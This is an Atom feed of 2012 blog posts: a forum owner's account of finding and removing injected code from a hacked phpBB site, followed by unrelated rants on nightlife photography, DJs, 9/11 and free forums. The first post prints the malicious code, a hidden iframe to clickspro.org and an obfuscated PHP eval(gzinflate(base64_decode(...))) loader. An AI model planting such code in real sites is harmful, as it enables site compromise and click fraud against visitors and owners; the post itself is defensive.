<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: rants | DV Digital]]></title>
  <link href="http://www.dan-vidal.com//blog/categories/rants/atom.xml" rel="self"/>
  <link href="http://www.dan-vidal.com//"/>
  <updated>2012-09-28T14:12:50-04:00</updated>
  <id>http://www.dan-vidal.com//</id>
  <author>
    <name><![CDATA[Dan Vidal - Pod]]></name>
    <email><![CDATA[dan@dan-vidal.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
    <updated>2012-09-27T23:34:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>

<p>Every so often, websites are hacked. Sometimes it's bad, sometimes it's harmless. The usual goal is to infect a viewer's computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of "harmless", are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>

<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can't trust them...</p>

<!-- more -->


<p>Why not?</p>

<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it's cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don't add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to "peer over the walls", as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it's hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>

<p>So, people invariably get in.</p>

<p>I first noticed something was amiss when I could not login to the forum's administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser's status bar. The redirects were pointing towards a site called "clickspro.org". Now, since I helped build TNL, I know each and every aspect of it's functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it's been over three years since TNL has explicitly seen any new features.</p>

<p>So, I started a little investigating.</p>

<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>

<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn't. I used the UNIX tool "cURL" to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This rendered the admin control panel for TNL in it's raw HTML format. Therein, I spotted the offending code:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>That does not belong.</p>

<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>

<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>

<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn't find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>

<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>

<p><blockquote><p></p></p><p><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p></p><p><p></p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>K/5DdO/p8AAAD//w==')));?>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I'm not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don't know what USENET is, Google it.</p>

<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>

<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>

<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>

<p>What mystifies me though, and I'm finally getting to the point of this rant, is that to implement this, it took some doing. This wasn't a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>

<p>A lot of effort, for little return. Clicks, likes, and impressions. It's all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it's an ecommerce site, are people buying anything? If it's a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>

<p>It's sad that people actually pay for this sort of thing. It's why my tactic with regards to web properties I don't explicitly own or have control over is to get people off them as fast as possible. I'll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don't harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I'd rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I'm the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don't play the stats game. I've opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>

<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn't find it so, it's really annoying.</p>

<p>Give me the real data and content.</p>

<p>And to the kid in Manila? Sorry about that. I know you're just doing your job, and it's better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>

<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Some of us are more than that guy with the camera.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/15/some-of-us-are-more-than-that-guy-with-the-camera/"/>
    <updated>2012-09-15T21:40:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/15/some-of-us-are-more-than-that-guy-with-the-camera</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/pete-5469.jpg" width="960" height="640" title="'Jordyn on the box at Space'" ></p>

<p>Sometimes when I think about what to put here too much, I'm at a loss. I can't force myself to write. Usually, when I drop an article in here, it's in relation to something I've done, read, or saw. This blog is very reactive and not proactive right now, I guess. This post is definitely reactive.</p>

<p>A few minutes ago, I read a blog entry by local shooter <a href="http://helloimscott.com/">Scott Alexander</a> on how he's burnt out on his primary subject, erotica and fetish, but not for the reasons you would think.</p>

<!-- more -->


<p>In the <a href="http://helloimscott.com/2012/09/adapting-new-battle-strategies/">blog post</a>, he sums it up eloquently:</p>

<p><blockquote><p>But it’s more than just being burnt out from this business. It’s so many different things. I tire of people looking at me sideways or making assumptions about me and my life. I tire of the judgement. I tire, when meeting someone new, that because someone else has said something to them, they’ve already made up in their mind what I’m all about and don’t even TALK to me with any kind of respect. I tire of not being taken seriously.</p><footer><strong>Scott Alexander</strong> <cite><a href='http://helloimscott.com/2012/09/adapting-new-battle-strategies/'>Adapting New Battle Strategies</a></cite></footer></blockquote></p>

<p>In a nutshell (correct me if I'm wrong Scott), it seems he is tired of being judged as a smut-peddler, when there's so much more to what he does.</p>

<p>Now, to a lesser extent, I encounter this on occasion when I talk to people about what I do, regardless of whether I meet them inside or outside of the club environment. Without sounding pretentious I like to think that I put my own spin on the images I capture. Since I have the luxury (haha) of running my own site, I have complete freedom to capture the images how I want them. Of course, I have to make some concessions with the client (that is why you will see photos that look like "typical" club shots), but I do have the flexibility to shoot what I want as well.</p>

<p>Part of the reason I can do that is the amount of time I've been rattling around Miami's club scene, which, by my watch, is around 15 years at this point. That's an eternity. I've been around longer than almost every venue in town, and most promoters and DJs. I got started in this when the post of 'club photographer' was a rare thing. And since it was rare, I was able to set the tone for myself, i.e. I wasn't under the gun to shoot 100000 images of drunk girls, and as time went on, even the people who wanted me to do so, ended up conceding, or moving on to someone who would shoot 10000 images of drunk girls.</p>

<p>In a nutshell that explains why I'm not rich off of photography and have to do web-related odd jobs to pay for things. Making money from producing just the photos (or any art for that matter) you want is extremely challenging.</p>

<p>In this modern era, I would probably not be able to score a single club-related photo gig if I was starting out. Simply because there's too many people/sites willing to shoot 10000 drunk-girl images for cheap, and almost zero demand for any sort of artistry in the photos captured. Nightclubs just want photos for social network promotion. And hey, they're running a business, and it costs an obscene amount of money to run it. FYI, a large nightclub costs around $30,000 a night sans DJ fees just to operate! So yeah, they kind of need people to show up.</p>

<p>Fortunately, I've got work via my veteran status and longtime connects, but if I had to do it all over again today (with the same eye/mindset), I probably wouldn't do it at all.</p>

<p>However, many would and are doing it. They will shoot 10000 photos a night of drunk girls with their cameras on "P" or green mode. Fire away, give 'em the little card, and move on to the next target. And annoy the DJ while they are at it.</p>

<p>And unfortunately, since this type of photographer is ubiquitous to the club scene, I'm sometimes lumped into the same mold as they are. Much as Scott is probably lumped into the same mold as whomever does the shooting for Bangbus, even though their material is worlds apart.</p>

<p>I see it sometimes, when people ask me what I shoot, and I try my best to sugarcoat it. "Yes, I shoot special events, concerts, and nightlife...". Which basically means I spend time taking photos in loud, hot, smoky rooms filled to the gills with drunk people.</p>

<p>However, even in those loud, smoky, drunk rooms, there's ample opportunity to compose and capture aesthetically pleasing images. The image up top is one example.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ldw-4558.jpg" width="960" height="640" title="'Jordyn again - yes, I shoot her a lot'" ></p>

<p>This would be another. In my humble opinion, this isn't a side of nightlife that people normally notice. And I like to capture that, to show those rare moments when something visually amazing happens for a split second, in a place most people consider just a loud, hot, smoky, drunk room.</p>

<p>It's why I carry sample images on my iPhone of what I'm able to do. If I can hold someone's attention for five seconds before they run away, since they judge me as being "That guy with the camera in the club...", I usually show them just what I mean. Then their opinions change.</p>

<p>However, on occasion the whole issue does get tiring. Which is why I've branched out into shooting scenics recently. Now, it's not to force myself to shoot something I don't like. I really do like scenics. On occasion in the past I've shot some rather stunning ones. But nowadays, I've actually begun to market myself as being able to do that as well. The nice thing is, I'm able to spring that as a surprise on the unsuspecting critic.</p>

<p><img src="https://s3.amazonaws.com/dvblog/bridge-4199_blog.jpg" width="960" height="640" title="'Islamorada Crossing'" ></p>

<p>Plus it's pretty relaxing. I actually took this photo and then just sat down under the bridge for an hour afterwards.</p>

<p>This last piece has actually sold a few copies over on my <a href="http://dan-vidal.fineartamerica.com">FAA page</a>. And when I show it to a critic who lumps me in with the likes of the unscrupulous run-and-gun shooters, they usually get quite embarrassed.</p>

<p>However, even if they do walk away, I don't mind. I still find enjoyment in shooting nightlife and events. The varied situations, the challenge of shooting in dark rooms, the dynamics, and getting to see some friends of mine all contribute to that, even after fifteen years. The burnout feeling comes and goes, but for the most part, it goes. Sometimes when I want to just stop, I'll find some glimmer (no kids, 'glimmer' is not the name of a new drug!) that keeps me going. Aside from the fact that I can't argue with the money, of course.</p>

<p>I'll be at Space tonight/tomorrow morning around 3 AM for one of the few good DJs left in the scene, Roger Sanchez. If anyone from here reads this and is there, come and say hello. I'll explain more in detail time permitting.</p>

<p>Scott, if you're reading, don't take any guff from those swine. You've got a great body of work, and it speaks for itself. If anything drop on them your collection from driving across the country and back on a scooter. That was amazing.</p>

<p>Sidebar: I drove across the country once. It was in a moving van equipped with an first-gen iPad 3G, 3 diverse smartphones, a cooler full of rations, and spares for everything. Halfway through I wanted to blow up the moving van and take my camera backpack, iPad, and some clothes and go buy a cheap scooter and finish the ride that way by going the scenic route. I'm gonna figure out how to make these sidebars on the side, soon.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[When did the DJ become more important than the crowd?]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/12/when-did-the-dj-become-more-important-than-the-crowd/"/>
    <updated>2012-09-12T11:33:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/12/when-did-the-dj-become-more-important-than-the-crowd</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/pete-5312.jpg" width="960" height="640" title="'Thanks!'" ></p>

<p>A random blog post over at <a href="http://www.faithfanzine.com/?p=1590">Faith Fanzine</a> caught my eye today. One quote from the article summed it up:</p>

<p><blockquote><p>When did we start watching a DJ instead of dancing with our mates , why do we put up with idiotic people taking up the floor who are filming the DJ ,why is the best dance floors now being cut to ribbons to provide extra table space for naff VIP’s ( Pacha in Ibiza hang your head in shame ) ,people with more money than taste and who in some extreme situations in the US have had DJs thrown off the decks because they did not like the music .</p></blockquote></p>

<p>Yes, when did we stop dancing?</p>

<!-- more -->


<p></p>

<p>I can't dance, that's a given. I pop around and do monkey moves, get embarrassed, and then I shuffle off to the side. But in the end, I'm still interacting with the crowd and my friends, and squeezing in a few photo ops as I mix and mingle. I take a few (OK a lot in some cases!) photos of the DJ, but I'm not in the middle of the dancefloor gawking at the booth the entire night.</p>

<p>It's actually part of the reason I prefer clubs to the current form of dance music experience, the festival/concert setup.</p>

<p><img class="center" src="http://seenightlife.com/photos/5595/original_MIA-6086.jpg" width="427" height="640"></p>

<p>In those setups, there is a stage, and a general admission "pit", much like a rock concert. The setup works well for rock concerts, since the whole point of a live musical act performing on stage is so you can see them work their instruments and sing. The act of a DJ mixing, no matter what tools they use, is generally a very passive act, and doesn't lend itself much to a rock-performance aesthetic, no matter how much jumping around and handwaving the DJ is doing. Anything more than that (I'm looking at you, Aoki), smacks of being too contrived and "trying too hard". Essentially the guy playing other people's music in the club has been placed in the center of a stage usually reserved for rockstars. And no matter how many pretty LED screens and image-mapped 3D renderings one throws up there, it comes down to that he's still up there playing back prerecorded sounds in a predetermined sequence. And a lot of DJs in concert situations don't even alter their playlists much from date to date. Zero musical flexibility. Might as well put an iPhone up there and play a prerecorded mix.</p>

<p>Plus, the shows are often at capacity, so there is actually zero room for dancing, and certainly no room for social interaction, since everyone is either focused on the guy pressing play on their laptop, or has their head buried in their phone, stroking their ego on Facebook.</p>

<p>I'm generally regarded as a borderline sociopathic personality. However, I do value social interaction when I'm out for a night of entertainment. It's why I value the few clubs left that actually encourage social discourse and interaction. Venues in town like Space, the Vagabond, and so forth, while they book DJ talent, don't rely on the DJ exclusively to drive their business. Some of my best nights out have been with the local guys on the decks, and I'm just there with my friends, having a good time. Some DJs still get it. <a href="http://seenightlife.com/users/pod/albums/pete-tong-at-space">Pete Tong</a> is a great example. This past weekend, he took to the decks at Space. No grandstanding, no tricks, he just played a great soundtrack to a night/morning out, and the crowd responded in kind. People were dancing, socializing, and having a good time, but not buried in their phones or gawking at the booth for hours on end. So there's hope...</p>

<p>Let's save the rockstar setup for the rockstars.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The obligatory September 11th Post.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/11/the-obligatory-september-11th-post/"/>
    <updated>2012-09-11T14:36:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/11/the-obligatory-september-11th-post</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/dade.png" width="538" height="359" title="'September 11th Post'" ></p>

<p>Today is the 11th Anniversary of the September 11th attacks on New York City. The social media sphere is filled with the obligatory graphics and memes of eagles, the WTC towers, and our soldiers deployed in Afghanistan. However, it was the above statement by my friend Dade which made the most sense thus far.</p>

<!-- more -->


<p>Don't get me wrong, the actual attack on New York on that fateful Tuesday morning was, in and of itself, a disaster. Over 3000 people died in what was the most brutal attack on American soil since the founding of the country.</p>

<p>However, as Dade said, the real disaster is in how it has been handled since then.</p>

<p>9/11 has become the crutch of American society. Where once we would keep moving forward in the face of adversity, we now cower behind closed doors, and beg our elected officials to do something, anything, to rid the world of the supposed terrorist menace, regardless of the implications to our liberties and our freedoms.</p>

<p>Have we become that timid and complacent that we will give up our essential freedoms and liberties just in the name of the illusion of safety? I say illusion since if someone wants to attack us on our own soil, they will, regardless of the safeguards put into place. I think, at the end of the day, what America can't cope with is the sobering realization that the world is rather ambivalent to our lifestyle and values. The bulk of the world doesn't have the time or the energy to waste on hating us. Sure, a few neckbeards in the Middle East might march around in circles screaming "Death to the Great Satan" (that's us, by the way!), but they don't represent the majority opinion. The people in the Middle East, in general, are too busy with their daily activities to waste much energy screaming about us. They have families, jobs, and lives, just like we do.</p>

<p>Same for the rest of the world. No one cares. They just want what's best for them, and what's best for them doesn't involve chanting overused slogans in town squares and burning American flags. Newsflash, most of those actions are staged and cleverly edited to overexpose the threat, making it easier for our government to pass senseless legislation like the PATRIOT Act, and the various regulations that enable agencies like the TSA to exist.</p>

<p>But, as long as the government appears to be doing something about the problem (if there even is a problem), the people are timid and complacent. As long as American Idol continues to broadcast, and people can continue to measure their self-worth in Facebook Likes and Klout scores, the people are cowed into submission, and they don't even know it. It's a modern day equivalent of bread and circuses. There's an enemy we can all get riled up about (the supposed beard with the AK-47), and we have our circuses in the form of social networks and mindless reality shows. Sure, such things existed before September 11, 2001, but it wasn't nearly as execrable as it was after the attacks. Even Pearl Harbor, which led to an actual global conflict, didn't precipitate the wholesale revocation of civil liberties, and the weakening of our resolve. If anything, Pearl Harbor served as a catalyst for us to defend those freedoms. Maybe terming those people "The Greatest Generation" isn't such a´clichéd term after all. I can only wonder what future historians will term our generation.</p>

<p>They'll have to make sure it's 140 characters or shorter so it fits in a tweet, I can tell you that much.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The free flow of opinion.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/10/the-free-flow-of-opinion/"/>
    <updated>2012-09-10T23:30:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/10/the-free-flow-of-opinion</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/keys-4655.jpg" width="960" height="640" title="'Above The Indian Key Channel Bridge - hey it is symbolic of the article'" ></p>

<p>For those of you who maybe only know me through this blog, I also am responsible for the operation of a little web forum called <a href="http://talknightlife.com/">Talk Nightlife</a>.</p>

<p>The reason I mention it in this context is because I actually picked up a few readers over the weekend based on my <a href="http://www.dan-vidal.com/blog/2012/09/08/wynwood-artwalk-too-hot-to-handle/">prior post about Artwalk</a>. A Twitter user called <a href="http://twitter.com/walkwynwood">WalkWynwood</a> must have had a Google Alert set up for Artwalk commentary, and kindly tweeted out my blog post on the good and bad of Artwalk. So, I picked up a few readers who only probably know me through this blog, and not the scandalous "TNL".</p>

<p>TNL has actually been an outlet of mine for five years, as of next Monday. It is probably the only nightlife-related resource on the internet not nominally subject to the whims of advertisers.</p>

<!-- more -->


<p>As a little bit of a backgrounder, TNL was founded in September of 2007, by refugees from another nightlife website, the now-defunct Cooljunkie. In existence since 2000, "CJ" (we love our acronyms!) was an independent site about Miami and South Beach nightlife and culture, founded by two English expats and <a href="http://ryanalynporter.com">the guy who helped me put this blog up.</a> It was actually a blog before blogs were blogs. And there was a notoriously popular forum component. I was bought on in mid-2001 as an itinerant photographer/writer. Unpaid at first, though the sites founders, Nick and Sarah, actually promoted the hell out of me and got me work as my unofficial "agents". It was a fair trade in my mind.</p>

<p>Unlike most web projects, there was a final payoff. In 2005, CJ was bought out by out-of-state rival Clubplanet, aka "CP". Owned by the now-defunct Track Entertainment, CP was a national web forum about nightlife and clubs, with their focus city being New York. There were a few articles in there but no one really bothered to read them. Much like CJ, the popular part of CP was the community aspect. CP bought out CJ because CP wished to have a Miami presence, and and we at CJ kept stopping them. The Miami clubs (our advertisers) were very loyal to us. So, the old logic of "if you can't beat 'em, join 'em", kicked in. CP made us an offer we couldn't refuse (payouts, equity in Track, and continued paid employment) and suddenly we found ourselves with corporate patronage.</p>

<p>Initially the operations continued as is, but with a budget. CJ was maintained as a business unit of it's own, and we were free to keep doing business, as it were, but with funding. It seemed ideal.</p>

<p>However, reality soon reared it's ugly head. CJ had a very active forum community component. Around Miami, it was feared by club owners, DJs, and promoters. Ugly secrets about nightlife routinely got out on the forums, much to the chagrin of the venues, some of which were advertisers. And even though you can't un-ring a bell, we routinely censored or deleted posts that could cast our key advertisers in a bad light. Editorial and community definitely were not separate from advertising. And, we couldn't maintain without these advertisers.</p>

<p>As time went on, eventually the corporate powers-that-be in New York wanted to take direct control over the Miami operations of CJ. That, and a few other things I'm not at liberty to mention (it went all the way to federal court at the end...), led to myself and the key players in CJ to depart the company, without being able to take CJ with us since it no longer was ours.</p>

<p>So, through a few machinations, we ended up under the corporate umbrella of one of the rivals to Track in the entertainment and media space. And thus, it was decided, with their patronage, to explicitly fund and found a website to counter the influence of CJ that we had built. Basically, we had to build something to destroy something else we built.</p>

<p>So, after a little thought, we realized that the most popular part of CJ was the forum, by a factor of four. People didn't go for the articles or even my photos, it was the community part they liked. They liked to be able to post their thoughts, and read the thoughts of others. The more controversial, the better. So, with that in mind, Talk Nightlife was born in September of 2007.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/tnl.jpg" width="960" height="632" title="'TNL'" ></p>

<p>Initially, we had the goals, and the requirement from the powers-that-be above, to get some advertisers on board and pay for the investment made to bring the website to life. There was a forum component, a guide to local events, and my photo gallery. And our mission was to keep it as open as possible, since it's what drew people to the site ultimately.</p>

<p>However, it did prove to be a very tricky, and ultimately unsuccessful balance. Advertisers simply weren't interested in being on a site where, a few lines down, there were statements that weren't necessarily supportive of them. The Opium Group, for example, would not place an ad, since they were regularly subject to criticism within the site. The whole "user-generated content" statement didn't hold water with them, since it was expected that us site operators would put our bank accounts before our principles, like good Americans.</p>

<p>After awhile, TNL as a financial priority fell by the wayside. Other web projects financed by the investor in TNL started to bear massive fruit, and took a lot of the pressure off of TNL itself. The investor only really cared that we made money for the "department", not that specific projects made money.</p>

<p>And besides, TNL was accomplishing one mission goal, to sink and destroy CJ, which it did admirably. CJ was rendered defunct, useless, and irrelevant to the discourse in nightlife. TNL slid into a parking orbit, and became the "drama magnet", where it remains today, and is arguably the least-restricted source of nightclub news on the internet.</p>

<p>Now, without a steady source of income (there are advertisers but the ads are usually in-kind or severely discounted), how does the site exist? Well, the site itself costs next to nothing to run. Hosting is inconsequentially cheap, and the maintenance performed by myself and Ryan is negligible. The only screwups are on the side of the hosting service, and we just wait those out. And, the investors lost interest in the site long ago, so there it sits. TNL only really keeps ticking over through a fortuitous set of circumstances. Ryan and I only keep it running because it's an interesting social experiment, and a distraction from our more mundane tasks. And I personally consider it a necessity in the nightlife industry, someone has to provide an unrestricted outlet.</p>

<p>Now, it's not to say TNL is uncensored. It's "self-censored". Each and every user has the ability to edit their own posts if they choose. Clubs could, in theory, pressure users directly to edit their words, if it came down to it. Now, the interesting thing is, since the advent of Facebook and Twitter, clubs focus almost exclusively on those, leaving old-style forums like TNL off their radars. I suppose I should thank Facebook for taking the heat off of us.</p>

<p>However, the question on occasion does come up, are we interested in making money off of the site? The usual answer is no, since we know that if the site is "monetized", eventually advertisers, even if they aren't directly insulted, will object to being placed close to controversial content. While TNL is self-censoring, as I mentioned, most people choose not to censor themselves. Insults, defamation, and even outright hate speech happen on TNL. It's the price of freedom I guess. I personally couldn't see a well-known advertiser like Bacardi wanting to have an ad positioned near the postings of someone who regularly ridicules minorities. Yes, there's someone on TNL who does that. We don't censor him, the community does. But the posts still remain.</p>

<p>So, TNL essentially remains free because we're choosing to not use it to make money.</p>

<p>Which begs the question, can a truly free source of information exist, and still make a profit? Or are truly free sources of information condemned to always operating at a loss, relying on the charity of others to merely exist?</p>

<p>With that in mind, I think we're at a point now in the evolution of the internet, where this is actually less and less of a question. It does not cost much money to operate a site. This blog is a perfect example of it. It is hosted on <a href="http://heroku.com">Heroku</a> which is a platform-as-a-service provider. They provide the infrastructure, and I provide the application, which, in this case, is this blog. Heroku lives in the cloud and charges me for only what I use. This blog is currently so low-impact I have yet to incur a fee. I'm not privy to why Heroku does this, but it may be a remnant of the <a href="http://www.dan-vidal.com/blog/2012/08/22/how-it-was/">community spirit</a> which characterized the early days of the modern internet era, or it might just be too much damn trouble to monitor usage as such a fine-grained level, so it's easier to let me squat here for free rather than charge me. And the actual pretty pictures are hosted over on <a href="http://s3.amazonaws.com/">Amazon S3</a>, which is another large-scale cloud effort, and my storage bill is less than a dollar so far. And, this blog is powered by <a href="http://octopress.org/">Octopress</a>, which is a free, open source blog platform. The breaks there are that there is no formal support or upgrade structure. The programmer of Octopress has no obligation to help me out.</p>

<p>In a nutshell, computing resources and storage are so cheap that maybe nowadays, uncensored and free channels of expression are easier to justify? Cheap hosting, cheap storage, and cheap or free publishing mechanisms. If TNL ever got the rug pulled out from under it, would it be as big of a disaster as some think? I used to think so. We went through the disaster once when we transitioned from CJ to TNL. It took awhile and a fair bit of investment to get the community to move over and to get everything pointed in the right direction. But that was 2007. Nowadays, a TNL-like service could be tossed up for a negligible investment, to the point one person could do it, without requiring a business plan or a way to make back the few dollars per year it costs to run.
Hm, maybe the community spirit is still around in a way. That's something. Whether it's about something inconsequential like nightlife, or something meaningful like politics, war, or social causes, truly free information outlets are necessary to a society that wants to call itself free. In my mind, the free flow of thought and ideas is more important than the balance sheet. Even though in today's society it's very difficult to put your ideals above your daily needs. Ideals don't put food on the table all the time.</p>

